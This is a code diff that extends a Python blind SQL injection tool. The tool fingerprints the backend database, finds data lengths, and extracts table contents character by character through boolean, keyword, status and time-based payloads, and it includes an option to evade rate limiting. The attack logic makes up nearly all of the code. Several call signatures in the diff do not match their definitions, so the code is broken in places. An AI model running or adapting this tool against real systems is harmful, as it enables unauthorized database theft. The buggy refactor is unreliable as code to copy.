@@ -10,7 +10,7 @@ import multiprocessing
 from urllib.parse import quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Constants and Usage
+### Constants and Usage
 
 def usage():
     usage = """
@@ -31,14 +31,16 @@ def usage():
         -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
         -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
         -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
+        -o, --output-file            Specify a file to output the extracted data
         -ba, --binary-attack         Use binary search for ASCII extraction
-        -da, --dictionary-attack     Path to a wordlist file for dictionary-based extraction
+        -da, --dictionary-attack     Path to a wordlist for dictionary-based extraction
+        --level                      Specify the threading level
         --delay                      Delay in seconds between requests to bypass rate limiting
         --timeout                    Timeout for each request in seconds (default: 10)
         --verbose                    Enable verbose output for debugging
         --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
         --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
-        --sleep-only                 Use only sleep-based detection methods
+        --sleep-only                 Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. 10 is recommended.
         --force                      Skip the injectability check and force a detection method (status, content, keyword, or sleep)
 
     Examples:
@@ -51,17 +53,17 @@ def usage():
 
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
-def version_queries():
-    file_path = os.path.join(os.path.dirname(__file__), 'version_queries.json')
+def queries():
+    file_path = os.path.join(os.path.dirname(__file__), 'queries.json')
     try:
         with open(file_path, 'r') as file:
-            version_queries = json.load(file)
-        return version_queries
+            queries = json.load(file)
+        return queries
     except Exception as e:
         print(f"Error loading version queries: {e}")
         return {}
 
-version_queries = version_queries()
+queries = queries()
 
 def max_workers(args):
 
@@ -77,7 +79,7 @@ def max_workers(args):
 
 max_workers = max_workers()
 
-# Main Logic
+### Main Logic
 
 def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
     
@@ -170,35 +172,80 @@ def detect_database(detection, request_template=None, injectable_headers={}, sta
         print(f"[-] Error during baseline request: {e}")
         return None, None
 
-    # Step 2: Prepare all db_names, version queries, and sleep queries
+    # Step 2: Prepare queries
     tasks = []
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        for db_name, info in version_queries.items():
+        for db_name, info in queries.items():
             db_query = info.get("version_query")
             sleep_function = info.get("sleep_function", None)
-
             payload = f"' AND ({db_query})"
             encoded_payload = quote(payload)
+            if args.sleep_only:
+                if isinstance(sleep_function, dict):
+                    sleep_queries = sleep_function.items()
+                else:
+                    sleep_queries = [(None, sleep_function)]
+                for db_specific, sleep_query in sleep_queries:
+                    sleep_query = sleep_query.replace('%', str(args.sleep_only))
+                    if not sleep_query or sleep_query == "N/A":
+                        print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
+                        continue
+                    payload = f"' AND {sleep_query}"
+                    encoded_payload = quote(payload)
 
-            tasks.append(executor.submit(detect, db_name, encoded_payload, baseline_status_code, 
-                                         baseline_content_length, request_template, sleep_function,
-                                         injectable_headers, static_headers, detection, args))
+                    tasks.append(executor.submit(detect, db_name, db_specific, encoded_payload, baseline_status_code, 
+                                                 baseline_content_length, request_template, sleep_query,
+                                                 injectable_headers, static_headers, detection, args))
+            else:
+                db_specific=None
+                tasks.append(executor.submit(detect, db_name, encoded_payload, baseline_status_code, 
+                                             baseline_content_length, request_template, 
+                                             injectable_headers, static_headers, detection, args))
 
-        # Step 3: Execute the requests and wait for the first successful detection
+        # Step 3: Wait for results
         for future in as_completed(tasks):
             result = future.result()
             if result:
-                db_name, substring_query, sleep_query, length_function = result
+                db_name, substring_query, sleep_query, length_query = result
                 print(f"[+] Database detected: {db_name}")
-                return db_name, substring_query, sleep_query, length_function
+                sleep_function = queries[db_name].get("sleep_function", None)
+                # Step 4: Narrow down the database if needed
+                if isinstance(sleep_function, dict):
+                    print(f"[*] Narrowing down to the specific database version...")
+                    og_sleep_only=args.sleep_only
+                    args.sleep_only=10
+                    specific_tasks = []
+                    with ThreadPoolExecutor(max_workers=max_workers) as specific_executor:
+                        for db_specific, sleep_query in sleep_function.items():
+                            sleep_query = sleep_query.replace('%', str(args.sleep_only))
+                            if not sleep_query or sleep_query == "N/A":
+                                print(f"[-] Sleep function for {db_specific} is not applicable or not found. Skipping...")
+                                continue
+                            payload = f"' AND {sleep_query}"
+                            encoded_payload = quote(payload)
+
+                            specific_tasks.append(specific_executor.submit(detect, db_name, db_specific, encoded_payload, baseline_status_code, 
+                                                                           baseline_content_length, request_template, sleep_query,
+                                                                           injectable_headers, static_headers, detection, args))
+
+                        # Step 5: Wait for more specific results
+                        for specific_future in as_completed(specific_tasks):
+                            specific_result = specific_future.result()
+                            if specific_result:
+                                db_name, substring_query, sleep_query, length_query = specific_result
+                                print(f"[+] Narrowed down to specific database: {db_specific}")
+                                args.sleep_only = og_sleep_only
+                                return db_name, substring_query, sleep_query, length_query
+
+                return db_name, substring_query, sleep_query, length_query
 
     print(f"[-] Unable to detect the database type. Exiting")
     return None, None
 
-def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_function, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template=None, injectable_headers={}, static_headers={}, args=None):
 
-    if not length_function:
-        print(f"[-] Length query not found for {db_name}.")
+    if not length_query or length_query == "N/A":
+        print(f"[-] Length query not found for {db_name}. Skipping data length detection.")
         return db_name, substring_query, sleep_query, None
 
     # Step 1: Baseline request
@@ -214,66 +261,58 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
     high = args.max_length
     length = None
 
-    length_queries = length_function.items() if isinstance(length_function, dict) else [(None, length_function)]
+    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")
 
-    # Step 2: Test length
-    for db_specific, length_query in length_queries():
-        if not length_query or length_query == "N/A":
-            print(f"[-] Length query for {db_specific} in {db_name} is not applicable or not found. Skipping...")
-            continue
-        else:
-            print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")
-
-        while low <= high:
-            mid = (low + high) // 2
-            payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
+    while low <= high:
+        mid = (low + high) // 2
+        payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
+        encoded_payload = quote(payload)
+        if args.sleep_only and sleep_query:
+            payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
             encoded_payload = quote(payload)
-            if args.sleep_only and sleep_query:
-                payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
-                encoded_payload = quote(payload)
 
-            try:
-                response, _ = inject(
-                    encoded_payload=encoded_payload,
-                    request_template=request_template,
-                    injectable_headers=injectable_headers,
-                    static_headers=static_headers,
-                    args=args
-                )
+        try:
+            response, _ = inject(
+                encoded_payload=encoded_payload,
+                request_template=request_template,
+                injectable_headers=injectable_headers,
+                static_headers=static_headers,
+                args=args
+            )
 
-                if not response:
-                    return None
-
-                if args.sleep_only:
-                    if response_time > 5:
-                        high = mid - 1
-                        length = mid
-                    else:
-                        low = mid + 1
-                elif detection == "keyword":
-                    if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                        high = mid - 1
-                        length = mid
-                    elif args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
-                        low = mid + 1
-                    else:
-                        low = mid + 1
-                elif detection == "status":
-                    if response.status_code != baseline_status_code:
-                        high = mid - 1
-                        length = mid
-                    else:
-                        low = mid + 1
-                elif detection == "content":
-                    if len(response.text) != baseline_content_length:
-                        high = mid - 1
-                        length = mid
-                    else:
-                        low = mid + 1
-
-            except requests.exceptions.RequestException as e:
-                print(f"[-] Error during length discovery: {e}")
+            if not response:
                 return None
+
+            if args.sleep_only:
+                if response_time > args.sleep_only:
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
+            elif detection == "keyword":
+                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                    high = mid - 1
+                    length = mid
+                elif args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
+                    low = mid + 1
+                else:
+                    low = mid + 1
+            elif detection == "status":
+                if response.status_code != baseline_status_code:
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
+            elif detection == "content":
+                if len(response.text) != baseline_content_length:
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
+
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during length discovery: {e}")
+            return None
 
     if length:
         print(f"[+] Data length discovered: {length}")
@@ -319,9 +358,8 @@ def extract_data(table, column, where_clause, db_name, substring_query, sleep_qu
                 encoded_payload = quote(payload)
 
                 result = extract(
-                    table, column, where_clause, db_name, substring_query, sleep_query, position, 
-                    request_template, injectable_headers, static_headers,
-                    extraction, baseline_status_code, baseline_content_length,
+                    extraction, request_template, injectable_headers, static_headers,
+                    baseline_status_code, baseline_content_length,
                     encoded_payload=encoded_payload, value=chr(mid), args=args
                     )
 
@@ -356,10 +394,14 @@ def extract_data(table, column, where_clause, db_name, substring_query, sleep_qu
 
                 payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
                 encoded_payload = quote(payload)
+                # Sleep only override for encoded payload
+                if args.sleep_only and sleep_query:
+                    payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}'"
+                    encoded_payload = quote(payload)
 
-                tasks.append(executor.submit(extract, table, column, where_clause, db_name, substring_query, sleep_query, position, value,
-                                             request_template, injectable_headers, static_headers, extraction,
-                                             baseline_status_code, baseline_content_length, encoded_payload, args))
+                tasks.append(executor.submit(extract, encoded_payload, value, extraction, request_template,
+                                             injectable_headers, static_headers, baseline_status_code,
+                                             baseline_content_length, args))
 
             for future in as_completed(tasks):
                 result = future.result()
@@ -381,10 +423,9 @@ def extract_data(table, column, where_clause, db_name, substring_query, sleep_qu
                         payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                         encoded_payload = quote(payload)
 
-                        result = extract(
-                            table, column, where_clause, db_name, substring_query, sleep_query, position, 
-                            request_template, injectable_headers, static_headers,
-                            extraction, baseline_status_code, baseline_content_length,
+                        result = extract( 
+                            extraction, request_template, injectable_headers, static_headers,
+                            baseline_status_code, baseline_content_length,
                             encoded_payload=encoded_payload, value=chr(mid), args=args
                             )
 
@@ -483,7 +524,7 @@ def parse_request(file_content):
     try:
         method, _, _ = request_line.split(' ', 2)
     except ValueError:
-        raise ValueError("Invalid request line: Unable to parse HTTP method")
+        raise ValueError("Invalid request line: It's all fucked up")
     
     headers = {}
     body = ""
@@ -593,25 +634,17 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
         print(f"[-] Error during request: {e}")
         return None, None
 
-def detect(encoded_payload, db_name, sleep_function, detection, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
+def detect(encoded_payload, db_name, db_specific, sleep_query, detection, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
     
-    substring_query = version_queries[db_name].get("subsubstring_query", None)
-    length_function = version_queries[db_name].get("length_function", None)
+    substring_query = queries[db_name].get("subsubstring_query", None)
+    length_function = queries[db_name].get("length_function", None)
+    length_query=None
 
-    # Sleep only override for encoded payload
-    if args.sleep_only:
-        if not sleep_function or sleep_function == "N/A":
-            print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
-            return None
-
-        sleep_queries= sleep_function.items() if isinstance(sleep_function, dict) else [(None, sleep_function)]
-
-        for db_specific, sleep_query in sleep_queries.items():
-            if not sleep_query or sleep_query == "N/A":
-                print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
-                continue
-            payload = f"' AND {sleep_query}"
-            encoded_payload = quote(payload)
+    if db_specific != None:
+        if isinstance(length_function, dict):
+            length_query = length_function.get(db_specific)
+        else:
+            length_query = length_function
 
     try:
         response, response_time = inject(
@@ -625,33 +658,28 @@ def detect(encoded_payload, db_name, sleep_function, detection, request_template
         if not response:
             return None
 
-        if args.sleep_only and response_time > 5:
-            return db_name, substring_query, sleep_query, length_function
+        if args.sleep_only and (response_time > args.sleep_only):
+            return db_name, substring_query, sleep_query, length_query if length_query is not None else length_function
         else:
             if detection == "status" and response.status_code != baseline_status_code:
-                return db_name, substring_query, None, length_function
+                return db_name, substring_query, None, length_query if length_query is not None else length_function
             elif detection == "content" and len(response.text) != baseline_content_length:
-                return db_name, substring_query, None, length_function
+                return db_name, substring_query, None, length_query
             elif detection == "keyword":
                 if args.true_keywords:
                     if any(keyword in response.text for keyword in args.true_keywords):
-                        return db_name, substring_query, None, length_function
+                        return db_name, substring_query, None, length_query
                 elif args.false_keywords:
                     if any(keyword in response.text for keyword in args.false_keywords):
                         return None
 
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during {payload_type}-based detection for {db_name}: {e}")
+        print(f"[-] Error during detection for {db_name}: {e}")
     
     return None
 
-def extract(encoded_payload, table, column, where_clause, db_name, substring_query, sleep_query, position, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
-
-    # Sleep only override for encoded payload
-    if args.sleep_only and sleep_query:
-            payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
-            encoded_payload = quote(payload)
+def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
     
     try:
         response, response_time = inject(
@@ -665,7 +693,7 @@ def extract(encoded_payload, table, column, where_clause, db_name, substring_que
         if not response:
             return None
 
-        if args.sleep_only and response_time > 5:
+        if args.sleep_only and response_time > args.sleep_only:
             return value
         else:
             if extraction == "keyword":
@@ -682,12 +710,12 @@ def extract(encoded_payload, table, column, where_clause, db_name, substring_que
                     return value
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during {'sleep-based ' if args.sleep_only else ''}extraction for {value}: {e}")
+        print(f"[-] Error during extraction for {value}: {e}")
         return None
 
     return None
 
-# MAIN
+### MAIN
 
 def main():
 
@@ -707,11 +735,11 @@ def main():
     parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
     parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2, help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
     parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
+    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
     parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
     parser.add_argument('--false-keywords', nargs='+', help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
-    parser.add_argument('--sleep-only', action='store_true', help="Use only sleep-based detection methods")
-    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
+    parser.add_argument('--sleep-only', type=int, help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. At least 10 seconds is recommended.")
     parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'], help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
 
     args = parser.parse_args()
@@ -735,7 +763,9 @@ def main():
     if not args.url and not request_template:
         print("[!] You must provide a valid request template or URL.")
         return
-
+    if args.sleep_only and args.sleep_only < 1:
+        print("[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 3")
+    
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
     static_headers = dict(args.static_headers) if args.static_headers else {}
 
@@ -768,7 +798,7 @@ def main():
             print(f"[+] Using {detection} detection method.")
         
     # Step 2: Detect the database type
-    db_name, substring_query, sleep_query, length_function = detect_database(request_template, injectable_headers, static_headers, detection=detection, args=args)
+    db_name, substring_query, sleep_query, length_query = detect_database(request_template, injectable_headers, static_headers, detection=detection, args=args)
 
     if not db_name:
         return
@@ -784,7 +814,7 @@ def main():
         db_name=db_name,
         substring_query=substring_query,
         sleep_query=sleep_query,
-        length_function=length_function,
+        length_query=length_query,
         detection=detection,
         request_template=request_template,
         injectable_headers=injectable_headers,
